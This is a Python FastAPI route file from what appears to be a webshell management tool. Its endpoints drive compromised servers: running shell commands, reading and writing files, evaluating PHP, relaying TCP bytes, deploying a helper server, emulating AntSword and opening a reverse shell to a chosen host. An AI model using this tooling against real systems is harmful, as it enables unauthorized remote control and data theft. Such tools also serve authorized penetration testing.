"""Session API routes"""

from pathlib import Path, PurePath, PurePosixPath, PureWindowsPath
from uuid import UUID, uuid4
from functools import wraps
import tempfile

import base64
import logging
import typing as t

import re
import chardet
from fastapi import APIRouter, Body, File, Form, Request, UploadFile
from fastapi.responses import Response

from .. import session_manager, session_types, session_connector
from ..core import SessionInterface, PHPSessionInterface
from ..utils import db
from ..core import SessionException, UserError
from .. import file_transfer_status

from pydantic import BaseModel
from ..vessel_php.main import start_vessel_server

from .base import write_temp_blob


logger = logging.getLogger("main")
router = APIRouter()


def remote_path(filepath: str) -> PurePath:
    """Guess path type (unix/windows) and return corresponding PurePath"""
    if re.match(r"^[a-zA-Z]:[/\\]", filepath):
        return PureWindowsPath(filepath)
    return PurePosixPath(filepath)


class FileContentRequest(BaseModel):
    current_dir: str
    filename: str
    text: str
    encoding: str


class PhpCodeRequest(BaseModel):
    code: str


def catch_user_error(fn):
    @wraps(fn)
    async def _wraps(*args, **kwargs):
        try:
            return await fn(*args, **kwargs)
        except SessionException as exc:
            return {
                "code": getattr(type(exc), "code", -500),
                "msg": f"{type(exc).__doc__}: {str(exc)}",
            }

    return _wraps


async def get_session(session_id: UUID):
    session: t.Union[session_types.SessionInfo, None] = (
        session_manager.get_session_info_by_id(session_id)
    )
    if not session:
        raise UserError("No such session")
    return session


async def list_sessions_readable():
    result = session_manager.list_sessions_db_readable() + [
        session_manager.session_to_readable(session)
        for session in session_connector.list_sessions()
    ]
    return result


@router.post("/test_webshell")
@catch_user_error
async def test_webshell(session_info: session_types.SessionInfo):
    """Test webshell"""
    session = session_manager.session_info_to_session(session_info)
    result = await session.test_usablility()
    if not result:
        return {"code": 0, "data": {"success": False, "msg": "Webshell not usable"}}
    return {"code": 0, "data": {"success": True, "msg": "Webshell usable"}}


@router.post("/update_webshell")
async def update_webshell(session_info: session_types.SessionInfo):
    """Add or update webshell"""
    if db.get_session_info_by_id(session_info.session_id):
        db.delete_session_info_by_id(session_info.session_id)
    db.add_session_info(session_info)
    session_manager.clear_session_cache()
    return {"code": 0, "data": session_info.session_id}


@router.get("/session")
@catch_user_error
async def api_list_sessions(session_id: t.Union[UUID, None] = None):
    """List all sessions or fetch session"""
    if session_id is None:
        return {"code": 0, "data": await list_sessions_readable()}
    return {"code": 0, "data": await get_session(session_id)}


@router.get("/session/{session_id}")
@catch_user_error
async def api_get_session(session_id: UUID):
    """Fetch session"""
    return {"code": 0, "data": await get_session(session_id)}


@router.get("/session/{session_id}/execute_cmd")
@catch_user_error
async def session_execute_cmd(session_id: UUID, cmd: str):
    """Execute shell command via session"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    result = await session.execute_cmd(cmd)
    return {"code": 0, "data": result}


@router.get("/session/{session_id}/get_pwd")
@catch_user_error
async def session_get_pwd(session_id: UUID):
    """Get session pwd"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    result = await session.get_pwd()
    return {"code": 0, "data": result}


@router.get("/session/{session_id}/list_dir")
@catch_user_error
async def session_list_dir(session_id: UUID, current_dir: str):
    """List directory via session"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    result = await session.list_dir(current_dir)
    return {"code": 0, "data": result}


@router.get("/session/{session_id}/mkdir")
@catch_user_error
async def session_mkdir(session_id: UUID, dirpath: str):
    """Create directory via session"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    await session.mkdir(dirpath)
    return {"code": 0, "data": True}


@router.get("/session/{session_id}/move_file")
@catch_user_error
async def session_move_file(session_id: UUID, filepath: str, new_filepath):
    """Move a file via session"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    await session.move_file(filepath, new_filepath)
    return {"code": 0, "data": True}


@router.get("/session/{session_id}/copy_file")
@catch_user_error
async def session_copy_file(session_id: UUID, filepath: str, new_filepath):
    """Copy a file via session"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    await session.copy_file(filepath, new_filepath)
    return {"code": 0, "data": True}


@router.get("/session/{session_id}/get_file_contents")
@catch_user_error
async def session_get_file_contents(session_id: UUID, current_dir: str, filename: str):
    """Get file contents via session"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    content, detected_encoding = None, None
    path = remote_path(current_dir) / filename
    content = await session.get_file_contents(str(path))
    try:
        detected_encoding = chardet.detect(content)["encoding"]
        if detected_encoding is None or detected_encoding == "ascii":
            detected_encoding = "utf-8" if current_dir.startswith("/") else "gbk"
        text = content.decode(detected_encoding)
        return {"code": 0, "data": {"text": text, "encoding": detected_encoding}}
    except UnicodeDecodeError as exc:
        return {
            "code": -500,
            "msg": f"Encoding error: detected {detected_encoding}, but decode failed: " + str(exc),
        }


@router.post("/session/{session_id}/put_file_contents")
@catch_user_error
async def session_put_file_contents(session_id: UUID, request: FileContentRequest):
    """使用session写入文件内容"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    path = remote_path(request.current_dir) / request.filename
    content = request.text.encode(request.encoding)
    success = await session.put_file_contents(str(path), content)
    return {"code": 0, "data": success}


@router.post("/session/{session_id}/upload_file")
@catch_user_error
async def session_upload_file(
    session_id: UUID,
    file: UploadFile = File(),
    folder: str = Form(),
):
    """Upload file via session"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    filename = file.filename
    content = await file.read()
    if filename is None:
        return {"code": -400, "msg": "Error: no filename"}
    path = remote_path(folder) / filename
    with file_transfer_status.record_upload_file(
        session_id, folder, filename
    ) as status_changer:
        success = await session.upload_file(str(path), content, callback=status_changer)
    return {"code": 0, "data": success}


@router.get("/session/{session_id}/download_file")
@catch_user_error
async def session_download_file(
    session_id: UUID,
    folder: str,
    filename: str,
):
    """Download file via session"""
    # 一个文件最多只有几十兆，浏览器应该可以轻松处理
    # 如果用户想要用webshell下载几百兆的文件。。。那应该是用户自己的问题
    filepath = remote_path(folder) / filename
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    with file_transfer_status.record_download_file(
        session_id, folder, filename
    ) as status_changer:
        content = await session.download_file(str(filepath), callback=status_changer)
    file_id = write_temp_blob(filename, content)
    return {
        "code": 0,
        "data": {
            "file_id": file_id,
        },
    }


@router.get("/session/{session_id}/delete_file")
@catch_user_error
async def session_delete_file(session_id: UUID, current_dir: str, filename: str):
    """Delete file via session"""
    # TODO: 让所有webshell支持删除文件夹
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    path = remote_path(current_dir) / filename
    result = await session.delete_file(str(path))
    return {"code": 0, "data": result}


@router.get("/session/{session_id}/supported_send_tcp_methods")
@catch_user_error
async def session_supported_send_tcp_methods(
    session_id: UUID,
):
    """Get supported TCP send methods"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    result = await session.get_send_tcp_support_methods()
    return {
        "code": 0,
        "data": result,
    }


@router.post("/session/{session_id}/send_bytes_tcp")
@catch_user_error
async def session_send_bytes_tcp(
    session_id: UUID,
    host: str = Body(),
    port: int = Body(),
    content_b64: str = Body(),
    send_method: t.Union[str, None] = Body(),
):
    """Send bytes over TCP via session"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    result = await session.send_bytes_over_tcp(
        host, port, base64.b64decode(content_b64), send_method
    )
    if result is None:
        return {"code": -600, "msg": "Target failed to send TCP"}
    return {
        "code": 0,
        "data": base64.b64encode(result),
    }


@router.get("/session/{session_id}/file_upload_status")
@catch_user_error
async def session_get_file_upload_status(session_id: UUID):
    """Read session upload status"""
    result = file_transfer_status.get_session_uploading_file(session_id)
    return {"code": 0, "data": result}


@router.get("/session/{session_id}/file_download_status")
@catch_user_error
async def session_get_file_download_status(session_id: UUID):
    """Read session download status"""
    result = file_transfer_status.get_session_downloading_file(session_id)
    return {"code": 0, "data": result}


@router.get("/session/{session_id}/basicinfo")
@catch_user_error
async def session_get_basicinfo(session_id: UUID):
    """Read session basic info"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    result = await session.get_basicinfo()
    return {"code": 0, "data": result}


@router.get("/session/{session_id}/download_phpinfo")
@catch_user_error
async def session_download_phpinfo(session_id: UUID):
    """Download phpinfo"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    if not isinstance(session, PHPSessionInterface):
        return {"code": -400, "msg": "Specified session is not a PHP Session"}
    content = await session.download_phpinfo()

    headers = {"Content-Disposition": "attachment; filename=phpinfo.html"}  # 设置文件名
    return Response(content=content, media_type="text/html", headers=headers)


@router.post("/session/{session_id}/php_eval")
@catch_user_error
async def session_php_eval(session_id: UUID, req: PhpCodeRequest):
    """Evaluate PHP code"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    if not isinstance(session, PHPSessionInterface):
        return {"code": -400, "msg": "Specified session is not a PHP Session"}
    result = await session.php_eval(req.code)
    return {"code": 0, "data": result}


@router.post("/session/{session_id}/open_reverse_shell")
@catch_user_error
async def session_open_reverse_shell(
    session_id: UUID,
    host: str = Body(),
    port: int = Body(),
):
    """Open reverse shell"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    await session.open_reverse_shell(host, port)
    return {"code": 0, "data": True}


@router.get("/session/{session_id}/deploy_vessel")
@catch_user_error
async def session_deploy_vessel(session_id: UUID):
    """Deploy vessel server"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    if not isinstance(session, PHPSessionInterface):
        return {"code": -400, "msg": "Specified session is not a PHP Session"}
    client_code = await start_vessel_server(session)
    return {"code": 0, "data": client_code}


@router.post("/session/{session_id}/emulated_antsword")
@catch_user_error
async def session_emulated_antsword(session_id: UUID, request: Request):
    """Integrate AntSword"""
    session: SessionInterface = session_manager.get_session_by_id(session_id)
    if not isinstance(session, PHPSessionInterface):
        return {"code": -400, "msg": "Specified session is not a PHP Session"}
    body: bytes = await request.body()
    status_code, content = await session.emulated_antsword(body)
    return Response(status_code=status_code, content=content)


@router.delete("/session/{session_id}")
async def delete_session(session_id: UUID):
    """Delete session"""
    session: t.Union[session_types.SessionInfo, None] = (
        session_manager.get_session_info_by_id(session_id)
    )
    if session is None:
        return {"code": -400, "msg": "No such session"}
    await session_manager.delete_session_info_by_id(session_id)
    return {"code": 0, "data": True}
